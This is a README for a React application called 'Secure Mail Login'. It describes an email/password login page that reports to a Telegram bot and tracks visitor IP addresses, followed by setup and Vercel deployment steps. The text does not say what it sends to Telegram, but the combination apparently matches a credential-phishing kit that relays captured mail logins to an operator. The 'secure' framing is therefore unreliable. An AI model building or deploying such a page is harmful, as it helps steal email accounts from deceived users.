# Secure Mail Login - React Application

A React-based mail login application with Telegram integration.

## Features

- Email/Password authentication interface
- Telegram bot integration for notifications
- IP address tracking
- User analytics dashboard
- Responsive design
- Environment variable configuration

## Setup

1. Install dependencies:
   ```bash
   npm install
   ```

2. Create a `.env` file in the root directory with your Telegram credentials:
   ```
   REACT_APP_TELEGRAM_TOKEN=your_telegram_bot_token
   REACT_APP_TELEGRAM_CHAT_ID=your_chat_id
   REACT_APP_SECRET_KEY=your_secret_key
   ```

3. Run the development server:
   ```bash
   npm start
   ```

4. Build for production:
   ```bash
   npm run build
   ```

## Deployment to Vercel

1. Install Vercel CLI (if not already installed):
   ```bash
   npm install -g vercel
   ```

2. Deploy to Vercel:
   ```bash
   vercel
   ```

3. Add environment variables in Vercel dashboard:
   - Go to your project settings
   - Navigate to Environment Variables
   - Add `REACT_APP_TELEGRAM_TOKEN`, `REACT_APP_TELEGRAM_CHAT_ID`, and `REACT_APP_SECRET_KEY`

## Environment Variables

- `REACT_APP_TELEGRAM_TOKEN`: Your Telegram bot token
- `REACT_APP_TELEGRAM_CHAT_ID`: Your Telegram chat ID
- `REACT_APP_SECRET_KEY`: Your application secret key

## Technologies Used

- React 18
- Bootstrap 5
- jQuery
- Font Awesome
- Vercel (deployment)

## License

Copyright © 2025

